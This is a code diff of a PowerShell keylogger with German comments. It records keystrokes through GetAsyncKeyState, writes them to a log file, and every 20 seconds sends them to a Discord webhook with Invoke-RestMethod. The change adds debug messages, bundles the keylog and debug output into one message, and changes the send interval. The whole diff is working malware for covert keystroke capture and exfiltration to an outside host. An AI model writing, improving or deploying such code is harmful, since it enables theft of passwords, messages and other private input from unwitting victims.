@@ -28,28 +28,88 @@ while ($true) {
         break
     }
     # 1. Tastatureingaben aufzeichnen
-    $keyPressed = $false
+
+
     foreach ($char in 32..126) {
+
         if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
+
             Add-Content -Path $logFile -Value ([char]$char)
-            $keyPressed = $true
+
+
+            $debugLogContent += "`n[DEBUG] Taste erkannt: $([char]$char) - $(Get-Date -Format o)"
+
         }
+
     }
-    # 2. Alle 20 Sekunden Log an Discord schicken
-    if ((Get-Date).Second % 5 -eq 0) {
+
+
+    # 2. Alle X Sekunden Log und Debug an Discord schicken
+
+    if ((Get-Date).Second % 20 -eq 0) {  # Alle 20 Sekunden
+
+
+        $discordMsg = ""
+
         if (Test-Path $logFile) {
+
             $keylog = Get-Content $logFile -Raw
+
             if ($keylog.Trim().Length -gt 0) {
-                try {
-                    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
-                } catch {}
+
+
+                $discordMsg += "[Keylog]`n$keylog`n"
+
+
+                $debugLogContent += "`n[INFO] Keylog an Discord gesendet: $(Get-Date -Format o)"
+
                 Clear-Content $logFile  # Nach dem Senden leeren
+
             }
+
         }
+
+
+        if ($debugLogContent.Trim().Length -gt 0) {
+
+
+            $discordMsg += "[Debug]`n$debugLogContent"
+
+
+            $debugLogContent = ""  # Nach dem Senden leeren
+
+
+        }
+
+
+        if ($discordMsg.Trim().Length -gt 0) {
+
+
+            try {
+
+
+                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$discordMsg}|ConvertTo-Json) -ContentType "application/json"
+
+
+            } catch {
+
+
+                $debugLogContent += "`n[ERROR] Fehler beim Senden an Discord: $_ - $(Get-Date -Format o)"
+
+
+            }
+
+
+        }
+
         Start-Sleep -Seconds 1
+
     } else {
+
         Start-Sleep -Milliseconds 40
+
     }
+
 }
 # Nach Timeout evtl. noch ein letztes Mal den Log senden
 if (Test-Path $logFile) {
